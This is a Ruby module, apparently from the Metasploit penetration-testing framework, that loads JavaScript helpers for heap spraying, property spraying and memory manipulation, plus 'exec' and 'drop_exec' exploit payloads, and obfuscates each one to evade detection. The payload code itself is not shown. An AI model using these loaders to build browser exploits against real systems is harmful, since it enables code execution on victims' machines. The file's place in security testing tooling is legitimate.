# -*- coding: binary -*-

require 'msf/core'

module Rex
module Exploitation
module Js

#
# Provides meomry manipulative functions in JavaScript
#
class Memory

  def self.mstime_malloc
    js = ::File.read(::File.join(Msf::Config.data_directory, "js", "memory", "mstime_malloc.js"))
    js = js.gsub(/W00TA/, Rex::Text.rand_text_hex(6))
    js = js.gsub(/W00TB/, Rex::Text.rand_text_hex(5))

    ::Rex::Exploitation::ObfuscateJS.new(js,
      {
        'Symbols' => {
          'Variables' => %w{ buf eleId acTag }
        }
      }).obfuscate
  end

  def self.heaplib2(custom_js='', opts={})
    js = ::File.read(::File.join(Msf::Config.data_directory, "js", "memory", "heaplib2.js"))

    unless custom_js.to_s.strip.empty?
      js << custom_js
    end

    js = ::Rex::Exploitation::JSObfu.new js
    js.obfuscate
    return js
  end

  def self.property_spray
    js = ::File.read(::File.join(Msf::Config.data_directory, "js", "memory", "property_spray.js"))

    ::Rex::Exploitation::ObfuscateJS.new(js,
      {
        'Symbols' => {
          'Variables' => %w{ sym_div_container data junk obj }
        }
      }).obfuscate
  end

  def self.heap_spray
    js = ::File.read(::File.join(Msf::Config.data_directory, "js", "memory", "heap_spray.js"))

    ::Rex::Exploitation::ObfuscateJS.new(js,
      {
        'Symbols' => {
          'Variables' => %w{ index heapSprayAddr_hi heapSprayAddr_lo retSlide heapBlockCnt }
        }
      }).obfuscate
  end

  def self.explib2
    js = ::File.read(::File.join(Msf::Config.data_directory, "js", "memory", "explib2", "lib", "explib2.js"))

    ::Rex::Exploitation::ObfuscateJS.obfuscate(js)
  end

  def self.explib2_payload(payload="exec")
    case payload
    when "drop_exec"
      js = ::File.read(::File.join(Msf::Config.data_directory, "js", "memory", "explib2", "payload", "drop_exec.js"))
    else # "exec"
      js = ::File.read(::File.join(Msf::Config.data_directory, "js", "memory", "explib2", "payload", "exec.js"))
    end

    ::Rex::Exploitation::ObfuscateJS.obfuscate(js)
  end

end
end
end
end
